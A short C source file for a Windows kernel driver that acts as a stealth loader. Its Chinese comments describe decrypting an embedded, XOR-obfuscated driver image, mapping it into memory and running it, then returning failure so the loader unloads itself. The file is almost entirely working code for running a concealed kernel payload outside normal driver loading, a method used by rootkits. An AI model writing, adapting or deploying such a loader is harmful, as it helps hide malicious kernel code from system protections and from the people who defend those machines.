#include <ntifs.h>
#include "tools.h"
#include "Loader.h"
#include "dll.h"

// 驱动加载器

VOID DriverUnload(PDRIVER_OBJECT pDriver)
{

}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	// sysData:加密后的sys文件
	ULONG dwImageSize = sizeof(sysData);
	unsigned char * pMemory = (unsigned char *)ExAllocatePool(NonPagedPool,dwImageSize);
	memcpy(pMemory, sysData, dwImageSize);
	// 解密
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xDE;
		pMemory[i] ^= 0x73;
	}
	LoadDriver(pMemory);	// 加载并执行
	ExFreePool(pMemory);
	pDriver->DriverUnload = DriverUnload;
	return STATUS_UNSUCCESSFUL;		// 执行完就卸载
}